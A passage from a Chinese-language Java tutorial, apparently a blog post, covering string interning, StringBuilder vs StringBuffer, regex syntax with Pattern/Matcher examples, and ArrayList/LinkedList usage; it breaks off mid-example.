class="string">&quot;abc&quot;</span> 是两个独立对象！此时堆中有一个新对象，常量池中有一个 <span class="string">&quot;abc&quot;</span>。</span><br><span class="line"><span class="number">3.</span>调用 .intern() 的过程：</span><br><span class="line">	JVM 检查常量池中是否已有内容相同的字符串（<span class="string">&quot;abc&quot;</span> 已存在），则直接返回常量池中的引用（不再创建新对象）。</span><br><span class="line"><span class="number">4.</span>s 被赋值为常量池中 <span class="string">&quot;abc&quot;</span> 的引用。</span><br><span class="line"> </span><br><span class="line">intern() 作用的关键总结：</span><br><span class="line">	如果常量池中已有该字符串，则返回池中的引用；</span><br><span class="line">	如果不存在，则将当前字符串放入池中，再返回池中的引用。</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>StringBuilder vs StringBuffer</strong>：</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>StringBuilder</th>
<th>StringBuffer</th>
</tr>
</thead>
<tbody><tr>
<td>线程安全</td>
<td>❌ 不安全</td>
<td>✅ 安全（synchronized）</td>
</tr>
<tr>
<td>性能</td>
<td>⚡️ 更快</td>
<td>⏳ 较慢</td>
</tr>
<tr>
<td>使用场景</td>
<td>单线程环境</td>
<td>多线程环境</td>
</tr>
</tbody></table>
</li>
<li><blockquote>
<p>用法完全一致！两者的 API 完全相同（方法名、参数、返回值、行为逻辑都一致），区别仅在于 线程安全性和性能。</p>
</blockquote>
</li>
</ul>
<h2 id="三、正则表达式深度解析"><a href="#三、正则表达式深度解析" class="headerlink" title="三、正则表达式深度解析"></a>三、正则表达式深度解析</h2><p>正则表达式（Regular Expression）是处理字符串的强大工具，用于匹配、查找、替换符合特定规则的文本。Java中通过<code>java.util.regex</code>包提供正则支持，核心类为<code>Pattern</code>（编译正则表达式）和<code>Matcher</code>（执行匹配操作）。</p>
<h3 id="1-正则表达式基本语法"><a href="#1-正则表达式基本语法" class="headerlink" title="1. 正则表达式基本语法"></a>1. 正则表达式基本语法</h3><h4 id="（1）字符匹配"><a href="#（1）字符匹配" class="headerlink" title="（1）字符匹配"></a>（1）字符匹配</h4><table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>普通字符</td>
<td>匹配自身</td>
<td><code>abc</code> 匹配 “abc”</td>
</tr>
<tr>
<td><code>.</code></td>
<td>匹配任意单个字符（除换行符）</td>
<td><code>a.c</code> 匹配 “abc”、”a1c”</td>
</tr>
<tr>
<td><code>[abc]</code></td>
<td>匹配括号内任意一个字符</td>
<td><code>[abc]</code> 匹配 “a”、”b”、”c”</td>
</tr>
<tr>
<td><code>[^abc]</code></td>
<td>匹配不在括号内的任意字符</td>
<td><code>[^abc]</code> 匹配 “d”、”1”</td>
</tr>
<tr>
<td><code>[a-z]</code></td>
<td>匹配指定范围的字符</td>
<td><code>[0-9a-zA-Z]</code> 匹配数字或字母</td>
</tr>
<tr>
<td><code>\d</code></td>
<td>等价于 <code>[0-9]</code>（数字）</td>
<td><code>\d&#123;3&#125;</code> 匹配 “123”</td>
</tr>
<tr>
<td><code>\D</code></td>
<td>等价于 <code>[^0-9]</code>（非数字）</td>
<td><code>\D</code> 匹配 “a”、”!”</td>
</tr>
<tr>
<td><code>\w</code></td>
<td>等价于 <code>[a-zA-Z0-9_]</code>（单词字符）</td>
<td><code>\w+</code> 匹配 “user123”</td>
</tr>
<tr>
<td><code>\W</code></td>
<td>等价于 <code>[^a-zA-Z0-9_]</code>（非单词字符）</td>
<td><code>\W</code> 匹配 “@”、”#”</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>匹配空白字符（空格、制表符等）</td>
<td><code>a\sb</code> 匹配 “a b”、”a\tb”</td>
</tr>
<tr>
<td><code>\S</code></td>
<td>匹配非空白字符</td>
<td><code>a\Sb</code> 匹配 “a1b”、”a@b”</td>
</tr>
</tbody></table>
<h4 id="（2）量词（控制匹配次数）"><a href="#（2）量词（控制匹配次数）" class="headerlink" title="（2）量词（控制匹配次数）"></a>（2）量词（控制匹配次数）</h4><table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>*</code></td>
<td>匹配前一个元素0次或多次（贪婪模式）</td>
<td><code>a*</code> 匹配 “”、”a”、”aa”</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前一个元素1次或多次（贪婪模式）</td>
<td><code>a+</code> 匹配 “a”、”aa”</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配前一个元素0次或1次（贪婪模式）</td>
<td><code>a?</code> 匹配 “”、”a”</td>
</tr>
<tr>
<td><code>&#123;n&#125;</code></td>
<td>匹配前一个元素恰好n次</td>
<td><code>a&#123;3&#125;</code> 匹配 “aaa”</td>
</tr>
<tr>
<td><code>&#123;n,&#125;</code></td>
<td>匹配前一个元素至少n次</td>
<td><code>a&#123;2,&#125;</code> 匹配 “aa”、”aaa”</td>
</tr>
<tr>
<td><code>&#123;n,m&#125;</code></td>
<td>匹配前一个元素n到m次</td>
<td><code>a&#123;1,3&#125;</code> 匹配 “a”、”aa”、”aaa”</td>
</tr>
<tr>
<td><code>*?</code>&#x2F;<code>+?</code>&#x2F;<code>??</code></td>
<td>非贪婪模式（尽可能少匹配）</td>
<td><code>&quot;a.*?b&quot;</code> 匹配 “aab” 中的 “aab”（而非贪婪的 “aab…b”）</td>
</tr>
</tbody></table>
<h4 id="（3）边界匹配"><a href="#（3）边界匹配" class="headerlink" title="（3）边界匹配"></a>（3）边界匹配</h4><table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>^</code></td>
<td>匹配字符串开始位置</td>
<td><code>^abc</code> 匹配 “abc123”（不匹配 “xabc”）</td>
</tr>
<tr>
<td><code>$</code></td>
<td>匹配字符串结束位置</td>
<td><code>abc$</code> 匹配 “123abc”（不匹配 “abcx”）</td>
</tr>
<tr>
<td><code>\b</code></td>
<td>匹配单词边界（单词与非单词字符之间）</td>
<td><code>\bcat\b</code> 匹配 “cat”（不匹配 “category” 中的 “cat”）</td>
</tr>
<tr>
<td><code>\B</code></td>
<td>匹配非单词边界</td>
<td><code>\Bcat\B</code> 匹配 “category” 中的 “cat”</td>
</tr>
</tbody></table>
<h4 id="（4）分组与捕获"><a href="#（4）分组与捕获" class="headerlink" title="（4）分组与捕获"></a>（4）分组与捕获</h4><table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>(pattern)</code></td>
<td>分组，将pattern视为一个整体，可捕获匹配结果</td>
<td><code>(ab)+</code> 匹配 “abab”</td>
</tr>
<tr>
<td><code>\n</code></td>
<td>引用第n个分组的匹配结果（n为1-9）</td>
<td><code>(a)\1</code> 匹配 “aa”</td>
</tr>
<tr>
<td><code>(?:pattern)</code></td>
<td>非捕获分组（仅分组不捕获结果）</td>
<td><code>(?:ab)+</code> 匹配 “abab” 但不保存分组</td>
</tr>
<tr>
<td><code>(?&lt;name&gt;pattern)</code></td>
<td>命名分组（通过名称引用）</td>
<td><code>(?&lt;id&gt;\d+)</code> 匹配数字并命名为”id”</td>
</tr>
</tbody></table>
<h4 id="（5）逻辑运算符"><a href="#（5）逻辑运算符" class="headerlink" title="（5）逻辑运算符"></a>（5）逻辑运算符</h4><table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>&#96;</td>
<td>&#96;</td>
<td>逻辑或，匹配左边或右边的表达式</td>
</tr>
<tr>
<td><code>()</code></td>
<td>结合逻辑或</td>
<td>&#96;(ab</td>
</tr>
</tbody></table>
<h3 id="2-Java正则核心类（Pattern与Matcher）"><a href="#2-Java正则核心类（Pattern与Matcher）" class="headerlink" title="2. Java正则核心类（Pattern与Matcher）"></a>2. Java正则核心类（Pattern与Matcher）</h3><h4 id="（1）Pattern类（编译正则表达式）"><a href="#（1）Pattern类（编译正则表达式）" class="headerlink" title="（1）Pattern类（编译正则表达式）"></a>（1）Pattern类（编译正则表达式）</h4><ul>
<li>作用：预编译正则表达式为Pattern对象（线程安全，可复用）。</li>
<li>常用方法：<ul>
<li><code>Pattern.compile(String regex)</code>：编译正则表达式。</li>
<li><code>Pattern.matches(String regex, CharSequence input)</code>：快速匹配（等价于编译后直接调用<code>matches()</code>）。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MatcherDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 先通过Pattern编译正则表达式（匹配3位数字）</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;\\d&#123;3&#125;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 传入输入字符串，通过Pattern的matcher()方法获取Matcher对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="string">&quot;abc123def456ghi78&quot;</span>;</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(input);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 此时matcher已绑定正则（\\d&#123;3&#125;）和输入字符串（abc123def456ghi78），可执行匹配操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="（2）Matcher类（执行匹配操作）"><a href="#（2）Matcher类（执行匹配操作）" class="headerlink" title="（2）Matcher类（执行匹配操作）"></a>（2）Matcher类（执行匹配操作）</h4><ul>
<li>作用：通过Pattern对象创建，用于对输入字符串执行匹配操作。</li>
<li>常用方法：<ul>
<li><code>matches()</code>：整个字符串是否完全匹配正则。</li>
<li><code>find()</code>：查找字符串中是否有匹配的子序列（可多次调用，每次找下一个）。</li>
<li><code>group()</code>：获取匹配的子序列（结合分组使用）。</li>
<li><code>start()</code>&#x2F;<code>end()</code>：获取匹配子序列的起始&#x2F;结束索引。</li>
<li><code>replaceAll(String replacement)</code>：替换所有匹配的子序列。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MatcherMethodWithResultDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 预编译正则表达式：\\d+ 匹配1个及以上的数字（整数）</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;\\d+&quot;</span>);</span><br><span class="line">        <span class="comment">// 待匹配的输入字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">inputStr</span> <span class="operator">=</span> <span class="string">&quot;abc123def456ghi7890&quot;</span>;</span><br><span class="line">        <span class="comment">// 2. 通过Pattern创建Matcher对象（绑定正则和输入字符串）</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(inputStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========== 1. 演示 matches() 方法：全量匹配 ==========</span></span><br><span class="line">        System.out.println(<span class="string">&quot;===== matches() 全量匹配 =====&quot;</span>);</span><br><span class="line">        <span class="comment">// 判断整个输入字符串是否完全符合正则（\\d+ 要求全是数字，此处有字母，返回false）</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFullMatch</span> <span class="operator">=</span> matcher.matches();</span><br><span class="line">        System.out.println(<span class="string">&quot;整个字符串是否完全匹配数字：&quot;</span> + isFullMatch); </span><br><span class="line">        <span class="comment">// 运行结果注释：输出 -&gt; 整个字符串是否完全匹配数字：false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意：调用matches()后，Matcher的匹配状态会改变，如需后续操作，先重置</span></span><br><span class="line">        matcher.reset();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========== 2. 演示 find() + group() + start()/end() 方法：查找+提取+获取位置 ==========</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n===== find() + group() + start()/end() 查找与提取 =====&quot;</span>);</span><br><span class="line">        <span class="comment">// while循环迭代：find() 每次调用查找下一个匹配的子串，无匹配时返回false</span></span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            <span class="comment">// group()：获取当前匹配到的完整子串（等价于group(0)）</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">matchContent</span> <span class="operator">=</span> matcher.group();</span><br><span class="line">            <span class="comment">// start()：获取匹配子串在输入字符串中的起始索引（从0开始，左闭）</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> matcher.start();</span><br><span class="line">            <span class="comment">// end()：获取匹配子串在输入字符串中的结束索引（左闭右开，即最后一个字符的索引+1）</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">endIndex</span> <span class="operator">=</span> matcher.end();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打印结果</span></span><br><span class="line">            System.out.printf(<span class="string">&quot;匹配到数字：%s，起始索引：%d，结束索引：%d，对应区间：[%d, %d)%n&quot;</span>,</span><br><span class="line">                    matchContent, startIndex, endIndex, startIndex, endIndex);</span><br><span class="line">            <span class="comment">// 循环内运行结果注释（依次输出）：</span></span><br><span class="line">            <span class="comment">// 匹配到数字：123，起始索引：3，结束索引：6，对应区间：[3, 6)</span></span><br><span class="line">            <span class="comment">// 匹配到数字：456，起始索引：9，结束索引：12，对应区间：[9, 12)</span></span><br><span class="line">            <span class="comment">// 匹配到数字：7890，起始索引：15，结束索引：19，对应区间：[15, 19)</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========== 3. 演示 group() 分组功能：正则中用()表示分组 ==========</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n===== group() 分组提取 =====&quot;</span>);</span><br><span class="line">        <span class="comment">// 重新编译带分组的正则：(\\d&#123;2&#125;)(\\d+) 表示把数字分为2组：前2位 + 剩余位数</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">groupPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;(\\d&#123;2&#125;)(\\d+)&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">groupMatcher</span> <span class="operator">=</span> groupPattern.matcher(inputStr);</span><br><span class="line">        <span class="comment">// 查找并提取分组内容</span></span><br><span class="line">        <span class="keyword">while</span> (groupMatcher.find()) &#123;</span><br><span class="line">            <span class="comment">// 1. 获取当前匹配项的完整子串（group(0) 固定对应完整匹配内容）</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">fullMatch</span> <span class="operator">=</span> groupMatcher.group(<span class="number">0</span>); </span><br><span class="line">            <span class="comment">// 匹配123时：fullMatch = &quot;123&quot;；匹配456时：fullMatch = &quot;456&quot;；匹配7890时：fullMatch = &quot;7890&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 获取第1个分组匹配的内容（对应第一个括号 (\\d&#123;2&#125;)：匹配2位数字）</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">group1</span> <span class="operator">=</span> groupMatcher.group(<span class="number">1</span>);    </span><br><span class="line">            <span class="comment">// 匹配123时：group1 = &quot;12&quot;（前2位数字）；匹配456时：group1 = &quot;45&quot;；匹配7890时：group1 = &quot;78&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3. 获取第2个分组匹配的内容（对应第二个括号 (\\d+)：匹配1位及以上剩余数字）</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">group2</span> <span class="operator">=</span> groupMatcher.group(<span class="number">2</span>);    </span><br><span class="line">            <span class="comment">// 匹配123时：group2 = &quot;3&quot;（剩余1位数字）；匹配456时：group2 = &quot;6&quot;；匹配7890时：group2 = &quot;90&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4. 格式化打印完整内容和分组内容</span></span><br><span class="line">            System.out.printf(<span class="string">&quot;完整匹配：%s，分组1（前2位）：%s，分组2（剩余）：%s%n&quot;</span>,</span><br><span class="line">                    fullMatch, group1, group2);</span><br><span class="line">            <span class="comment">// 按格式拼接字符串并输出，对应示例中的三行打印结果</span></span><br><span class="line">            <span class="comment">// 循环内运行结果注释（依次输出）：</span></span><br><span class="line">            <span class="comment">// 完整匹配：123，分组1（前2位）：12，分组2（剩余）：3</span></span><br><span class="line">            <span class="comment">// 完整匹配：456，分组1（前2位）：45，分组2（剩余）：6</span></span><br><span class="line">            <span class="comment">// 完整匹配：7890，分组1（前2位）：78，分组2（剩余）：90</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========== 4. 演示 replaceAll() 和 replaceFirst() 替换方法 ==========</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n===== replaceAll() + replaceFirst() 替换 =====&quot;</span>);</span><br><span class="line">        <span class="comment">// 重置Matcher状态，重新绑定输入字符串</span></span><br><span class="line">        matcher.reset();</span><br><span class="line">        <span class="comment">// replaceAll()：替换所有匹配的子串为指定内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">replaceAllResult</span> <span class="operator">=</span> matcher.replaceAll(<span class="string">&quot;【数字】&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;替换所有数字后的结果：&quot;</span> + replaceAllResult);</span><br><span class="line">        <span class="comment">// 运行结果注释：输出 -&gt; 替换所有数字后的结果：abc【数字】def【数字】ghi【数字】</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再次重置Matcher</span></span><br><span class="line">        matcher.reset();</span><br><span class="line">        <span class="comment">// replaceFirst()：只替换第一个匹配的子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">replaceFirstResult</span> <span class="operator">=</span> matcher.replaceFirst(<span class="string">&quot;【首个数字】&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;只替换第一个数字后的结果：&quot;</span> + replaceFirstResult);</span><br><span class="line">        <span class="comment">// 运行结果注释：输出 -&gt; 只替换第一个数字后的结果：abc【首个数字】def456ghi7890</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="3-常用场景示例"><a href="#3-常用场景示例" class="headerlink" title="3. 常用场景示例"></a>3. 常用场景示例</h3><h4 id="（1）数据验证"><a href="#（1）数据验证" class="headerlink" title="（1）数据验证"></a>（1）数据验证</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 验证邮箱（简单规则）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">emailRegex</span> <span class="operator">=</span> <span class="string">&quot;^[a-zA-Z0-9_]+@[a-zA-Z0-9]+(\\.[a-zA-Z0-9]+)+$&quot;</span>;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEmail</span> <span class="operator">=</span> <span class="string">&quot;user@example.com&quot;</span>.matches(emailRegex); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证手机号（中国大陆）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">phoneRegex</span> <span class="operator">=</span> <span class="string">&quot;^1[3-9]\\d&#123;9&#125;$&quot;</span>;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isPhone</span> <span class="operator">=</span> <span class="string">&quot;13812345678&quot;</span>.matches(phoneRegex); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>


<h4 id="（2）文本提取"><a href="#（2）文本提取" class="headerlink" title="（2）文本提取"></a>（2）文本提取</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从HTML中提取所有链接（&lt;a href=&quot;xxx&quot;&gt;）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="string">&quot;&lt;a href=&#x27;https://a.com&#x27;&gt;链接1&lt;/a&gt;&lt;a href=&#x27;https://b.com&#x27;&gt;链接2&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="type">Pattern</span> <span class="variable">linkPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;href=[&#x27;\&quot;](.*?)[&#x27;\&quot;]&quot;</span>);</span><br><span class="line"><span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> linkPattern.matcher(html);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;链接：&quot;</span> + matcher.group(<span class="number">1</span>)); <span class="comment">// 提取分组1的内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// 链接：https://a.com</span></span><br><span class="line"><span class="comment">// 链接：https://b.com</span></span><br></pre></td></tr></table></figure>


<h4 id="（3）文本替换"><a href="#（3）文本替换" class="headerlink" title="（3）文本替换"></a>（3）文本替换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 替换字符串中的所有数字为&quot;*&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;密码：123456，验证码：789&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">replaced</span> <span class="operator">=</span> text.replaceAll(<span class="string">&quot;\\d&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">System.out.println(replaced); <span class="comment">// 输出：密码：******，验证码：***</span></span><br></pre></td></tr></table></figure>







<h2 id="四、数组与集合框架"><a href="#四、数组与集合框架" class="headerlink" title="四、数组与集合框架"></a>四、数组与集合框架</h2><h3 id="1-数组底层实现"><a href="#1-数组底层实现" class="headerlink" title="1. 数组底层实现"></a>1. 数组底层实现</h3><ul>
<li><strong>内存布局</strong>：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line"><span class="comment">// 内存结构：</span></span><br><span class="line"><span class="comment">// [arr对象头][length=3][0][0][0]</span></span><br></pre></td></tr></table></figure></li>
<li><strong>多维数组</strong>：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] matrix = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line"><span class="comment">// 内存结构：</span></span><br><span class="line"><span class="comment">// [matrix对象头][length=2][array1][array2]</span></span><br><span class="line"><span class="comment">// array1: [length=3][0][0][0]</span></span><br><span class="line"><span class="comment">// array2: [length=3][0][0][0]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-集合框架深度解析"><a href="#2-集合框架深度解析" class="headerlink" title="2. 集合框架深度解析"></a>2. 集合框架深度解析</h3><h4 id="1-List实现类"><a href="#1-List实现类" class="headerlink" title="(1) List实现类"></a>(1) List实现类</h4><table>
<thead>
<tr>
<th>类型</th>
<th>底层结构</th>
<th>扩容机制</th>
<th>特点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ArrayList</strong></td>
<td>动态数组</td>
<td>1.5倍扩容</td>
<td>随机访问快<br>插入删除慢</td>
<td>频繁查询<br>较少修改</td>
</tr>
<tr>
<td><strong>LinkedList</strong></td>
<td>双向链表</td>
<td>无扩容</td>
<td>插入删除快<br>随机访问慢</td>
<td>频繁增删<br>较少查询</td>
</tr>
</tbody></table>
<ul>
<li><p><strong>ArrayList扩容细节</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JDK1.8源码</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> elementData.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>); <span class="comment">// 1.5倍</span></span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = minCapacity;</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ArrayList常用方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayListSimpleDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建ArrayList对象，存储字符串类型元素</span></span><br><span class="line">        List&lt;String&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 向集合中添加元素（尾部添加，简单高效）</span></span><br><span class="line">        arrayList.add(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">        arrayList.add(<span class="string">&quot;Go&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;初始ArrayList：&quot;</span> + arrayList);</span><br><span class="line">        <span class="comment">// 运行结果：初始ArrayList：[Java, Python, C++, Go]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 核心优势：随机访问（通过索引快速获取元素，对应表格中“随机访问快”）</span></span><br><span class="line">        <span class="comment">// 索引从0开始，直接获取第2个元素（Python）、第3个元素（C++）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">element1</span> <span class="operator">=</span> arrayList.get(<span class="number">1</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">element2</span> <span class="operator">=</span> arrayList.get(<span class="number">2</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;索引1的元素：&quot;</span> + element1 + <span class="string">&quot;，索引2的元素：&quot;</span> + element2);</span><br><span class="line">        <span class="comment">// 运行结果：索引1的元素：Python，索引2的元素：C++</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 修改元素（通过索引快速修改）</span></span><br><span class="line">        arrayList.set(<span class="number">3</span>, <span class="string">&quot;Rust&quot;</span>); <span class="comment">// 将索引3的元素（Go）改为Rust</span></span><br><span class="line">        System.out.println(<span class="string">&quot;修改后ArrayList：&quot;</span> + arrayList);</span><br><span class="line">        <span class="comment">// 运行结果：修改后ArrayList：[Java, Python, C++, Rust]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 删除元素（尾部删除高效，中间删除效率低，对应表格“插入删除慢”）</span></span><br><span class="line">        arrayList.remove(<span class="number">2</span>); <span class="comment">// 删除索引2的元素（C++）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;删除索引2元素后：&quot;</span> + arrayList);</span><br><span class="line">        <span class="comment">// 运行结果：删除索引2元素后：[Java, Python, Rust]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 遍历集合（普通for循环，利用索引快速遍历，适配ArrayList特性）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;普通for循环遍历（适配ArrayList随机访问特性）：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arrayList.size(); i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;索引&quot;</span> + i + <span class="string">&quot;：&quot;</span> + arrayList.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 运行结果：</span></span><br><span class="line">        <span class="comment">// 索引0：Java</span></span><br><span class="line">        <span class="comment">// 索引1：Python</span></span><br><span class="line">        <span class="comment">// 索引2：Rust</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>LinkedList常用方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedListSimpleDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建LinkedList对象，存储整数类型元素</span></span><br><span class="line">        LinkedList&lt;Integer&gt; linkedList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 向集合中添加元素（支持尾部、头部添加，高效）</span></span><br><span class="line">        linkedList.add(<span class="number">10</span>); <span class="comment">// 